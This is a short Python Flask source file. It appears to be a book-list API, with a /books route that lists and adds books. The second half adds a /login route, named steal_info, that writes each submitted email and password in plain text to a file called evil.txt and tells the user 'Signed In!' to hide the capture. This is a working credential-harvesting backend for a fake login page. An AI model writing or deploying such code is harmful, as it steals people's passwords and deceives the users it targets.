from flask import Flask, jsonify, request, redirect
from flask_cors import CORS
from bs4 import BeautifulSoup as bs

#instantiate the app
app = Flask(__name__)
app.config.from_object(__name__)

# BOOKS
BOOKS = [
  {
    'title': 'On the Road',
    'author': 'Jack Kerouac',
    'read': True
  },
  {
    'title': 'Harry Potter and the Philosopher\'s Stone',
    'author': 'J. K. Rowling',
    'read': False
  },
  {
    'title': 'Green Eggs and Ham',
    'author': 'Dr. Seuss',
    'read': True
  }
]

# enable CORS
CORS(app, resources={r'/*': {'origins': '*'}})

# sanity check route
@app.route('/books', methods=['GET', 'POST'])
def all_books():
  response_object = {'status': 'success'}
  if request.method == 'POST':
    post_data = request.get_json()
    BOOKS.append({
      'title': post_data.get('title'),
      'author': post_data.get('author'),
      'read': post_data.get('read')
    })
    response_object['message'] = 'Book added!'
  else:
    response_object['books'] = BOOKS
  return jsonify(response_object)

@app.route('/login', methods=['POST'])
def steal_info():
  response_object = {'status': 'success'}
  if request.method == "POST":
    post_data = request.get_json()

    # Get the email and password from the request
    email = post_data.get('email')
    password = post_data.get("password")

    # Open the file to write the email and password
    file = open("evil.txt", "a")

    evil_data = "\n" + email + " : " + password
    file.write(evil_data)

    file.close()
    response_object['message'] = "Signed In!"
  
  return jsonify(response_object)

if __name__ == '__main__':
  app.run()
